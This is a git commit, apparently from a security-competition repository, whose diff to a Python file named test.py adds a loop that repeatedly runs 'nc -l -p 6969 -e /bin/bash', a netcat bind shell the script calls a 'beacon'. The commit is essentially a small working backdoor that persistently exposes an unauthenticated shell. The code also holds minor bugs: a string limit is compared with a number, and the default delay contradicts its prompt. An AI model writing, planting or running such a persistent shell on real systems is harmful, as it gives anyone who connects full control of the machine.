b109e567cd2a7c342a2400167fc59884b24ccd25
PapaChain <braydenjw00@gmail.com>
2020-01-21 13:53:05 -0500

    Python Script

--- ISTS/python_scripts/test.py
+++ ISTS/python_scripts/test.py
@@ -1,17 +1,20 @@
 import time
+import os
+import subprocess
 
 delay = input("How many seconds should I wait to re-open the beacon?(120s default)")
 limit = input("should I stop after a certian amount of iterations? (No limit default)")
+
 if delay == '':
     delay = 1
 
 if limit == '':
     while True:
-        print("do stuff")
+        os.system("nc -l -p 6969 -e /bin/bash")
         time.sleep(5)
 
 else:
     while limit > 0:
-        print("do stuff")
+        os.system("nc -l -p 6969 -e /bin/bash")
         time.sleep(delay)
         limit -= 1
